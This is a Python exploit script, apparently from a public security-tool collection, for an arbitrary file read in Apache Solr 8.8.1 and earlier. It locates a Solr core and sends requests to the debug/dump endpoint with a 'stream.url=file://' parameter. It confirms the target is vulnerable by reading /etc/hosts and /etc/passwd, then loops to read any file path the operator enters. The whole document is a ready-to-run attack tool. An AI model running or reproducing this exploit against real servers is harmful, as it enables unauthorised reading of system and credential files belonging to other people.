#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/03/23

import json
import time
import requests
from argparse import ArgumentParser

class EXP:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()
        print("timeout:", self.args.timeout)
        self.hasVuln = False
        self.exploit()

    def banner(self):
        logo = r"""
      _____       _      _____                _                      ______ _ _
     / ____|     | |    |  __ \              | |   /\               |  ____(_) |
    | (___   ___ | |_ __| |__) |___  __ _  __| |  /  \   _ __  _   _| |__   _| | ___
     \___ \ / _ \| | '__|  _  // _ \/ _` |/ _` | / /\ \ | '_ \| | | |  __| | | |/ _ \
     ____) | (_) | | |  | | \ \  __/ (_| | (_| |/ ____ \| | | | |_| | |    | | |  __/
    |_____/ \___/|_|_|  |_|  \_\___|\__,_|\__,_/_/    \_\_| |_|\__, |_|    |_|_|\___|   EXP
                                                                __/ |
                                                               |___/         Author: Cr4y0n
        """
        msg = "Apache Solr <= 8.8.1 Can Read Any File.\n"
        print("\033[91m" + logo + "\033[0m")
        print(msg)

    def parseArgs(self):
        # date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=True, type=str, help=f"The target address, (ip:port) or url")
        parser.add_argument("-t", "--timeout", required=False, type=int, default=3,  help="request timeout(default 3)")
        # parser.add_argument("-o", "--output", required=False, type=str, default=f"./{date}.txt",  help=f"Vuln url output file, default is ./{date}.txt")
        return parser.parse_args()

    # 验证漏洞
    def verify(self):
        try:
            self.url = self.args.url.replace("http://", "")
        except:
            try:
                self.url = self.args.url.replace("https://", "")
            except:
                pass
        try:
            reqURL = "http://" + self.url + "/solr/"
            requests.get(url=reqURL, timeout=self.args.timeout)
        except:
            print(f"[-] {self.url} cannot be connected\n")
            return
        try:
            reqURL = "http://" + self.url + "/solr/admin/cores?indexInfo=false&wt=json"
            rep = requests.get(url=reqURL, timeout=self.args.timeout)
            self.name = list(json.loads(rep.text)["status"])[0]
        except:
            print(f"[-] {self.url} is safe\n")
            return
        if "127.0.0.1" in self.checkVuln("/etc/hosts"):
            msg = f"\033[32m[+] {self.url} Exist Vulnerability !\033[0m\n"
            self.hasVuln = True
        else:
            if "root" in self.checkVuln("/etc/passwd"):
                msg = f"\033[32m[+] {self.url} Exist Vulnerability !\033[0m\n"
                self.hasVuln = True
            else:
                msg = f"[-] {self.url} is safe\n"
        print(msg)

    # 利用漏洞读取文件检验漏洞存在与否
    def checkVuln(self, filename):
        reqURL = "http://" + self.url + "/solr/" + self.name + "/debug/dump?param=ContentStreams&wt=json"
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        postData = "stream.url=file://" + filename
        try:
            rep = requests.get(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout)
            repData = str(rep.text)
            fileData = json.loads(repData)["streams"][0]["stream"]
            return fileData
        except IndexError:
            return ""

    # 利用漏洞读取文件
    def readFile(self, filename):
        reqURL = "http://" + self.url + "/solr/" + self.name + "/debug/dump?param=ContentStreams&wt=json"
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        postData = "stream.url=file://" + filename
        try:
            rep = requests.get(url=reqURL, headers=headers, data=postData, timeout=self.args.timeout)
            repData = str(rep.text)
            fileData = json.loads(repData)["streams"][0]["stream"]
            print("\n" + fileData.replace(r"\n", "\n"))
        except KeyError:
            print("\nRead Failed.\n")
        except:
            print("\nError.\n")

    # 攻击
    def exploit(self):
        self.verify()
        if self.hasVuln:
            while True:
                try:
                    remoteFile = input("\033[42m" + "Input File/Path>" + "\033[0m" + " ")
                    self.readFile(remoteFile)
                except KeyboardInterrupt:
                    print("\n\nBye~\n")
                    return

if __name__ == "__main__":
    EXP()


